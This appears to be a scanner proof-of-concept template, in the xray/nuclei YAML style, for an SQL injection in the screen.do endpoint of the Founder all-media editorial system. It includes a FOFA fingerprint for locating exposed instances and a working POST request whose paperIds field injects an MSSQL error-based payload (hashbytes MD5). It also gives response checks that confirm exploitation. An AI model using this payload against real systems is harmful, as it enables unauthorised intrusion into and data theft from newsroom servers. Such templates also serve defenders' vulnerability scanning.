id: poc-yaml-founder-newsedit-screen-do-sqli
info:
  name: 方正全媒体采编系统 screen.do SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 方正全媒体采编系统
  fofa: app="FOUNDER-全媒体采编系统"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /newsedit/newsplan/screen.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+&terminalType=123
  expression: 'status_code == 200 &&

    contains(body,"在将 nvarchar 值") &&

    contains(body,"报道中心") &&

    contains(body,"0x" + t2) &&

    contains(body,"转换成数据类型 int 时失败")

    '
transport: http
